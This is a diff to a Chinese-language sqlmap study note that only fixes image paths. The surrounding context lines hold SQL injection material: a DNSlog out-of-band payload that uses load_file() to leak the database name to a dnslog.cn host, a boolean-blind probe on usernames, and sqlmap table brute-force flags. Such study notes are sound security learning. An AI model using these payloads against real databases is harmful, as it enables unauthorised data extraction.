@@ -60,19 +60,19 @@ in-band通常是服务器直接返回数据；
 
 #### Error-based sqli
 
-![image-20230210171300989](.\sqlmap使用笔记.assets\image-20230210171300989.png)
+![image-20230210171300989](./sqlmap使用笔记.assets/image-20230210171300989.png)
 
 #### Union-based sqli
 
-![image-20230210171313737](.\sqlmap使用笔记.assets\image-20230210171313737.png)
+![image-20230210171313737](./sqlmap使用笔记.assets/image-20230210171313737.png)
 
 #### Time-based Blind sqli
 
-![image-20230210171323011](.\sqlmap使用笔记.assets\image-20230210171323011.png)
+![image-20230210171323011](./sqlmap使用笔记.assets/image-20230210171323011.png)
 
 #### Boolean-based Blind sqli
 
-![image-20230210171340401](.\sqlmap使用笔记.assets\image-20230210171340401.png)
+![image-20230210171340401](./sqlmap使用笔记.assets/image-20230210171340401.png)
 
 #### Stacked injections
 
@@ -100,7 +100,7 @@ select load_file("\\\\uqusq5.dnslog.cn\\a.txt");  # 使用unc协议读取远程�
 select load_file(concat("\\\\",database(),".uqusq5.dnslog.cn\\a.txt"));  # load_file()函数虽然不可以向外网发起请求，但是可以做域名的解析
 ```
 
-![image-20230211133443451](.\sqlmap使用笔记.assets\image-20230211133443451.png)
+![image-20230211133443451](./sqlmap使用笔记.assets/image-20230211133443451.png)
 
 
 
@@ -186,7 +186,7 @@ select (select 1)s;  # 将查询语句(select 1)重命名为s
 select * from users where id=1 and exists(select * from users where ascii(username)=68);  # 判断users表中id为1用户的用户名首字母的ascii是不是等于68
 ```
 
-![image-20230210195351971](.\sqlmap使用笔记.assets\image-20230210195351971.png)
+![image-20230210195351971](./sqlmap使用笔记.assets/image-20230210195351971.png)
 
 
 
@@ -992,7 +992,7 @@ u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要�
 
 ### Fingerprint：指纹！
 
-![image-20230211222738216](.\sqlmap使用笔记.assets\image-20230211222738216.png)
+![image-20230211222738216](./sqlmap使用笔记.assets/image-20230211222738216.png)
 
 
 
@@ -1034,7 +1034,7 @@ u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要�
 
 字典在：/usr/share/sqlmap/data/txt/
 
-![image-20230211230655798](.\sqlmap使用笔记.assets\image-20230211230655798.png)
+![image-20230211230655798](./sqlmap使用笔记.assets/image-20230211230655798.png)
 
 ```
 --common-tables   # 爆破常见表
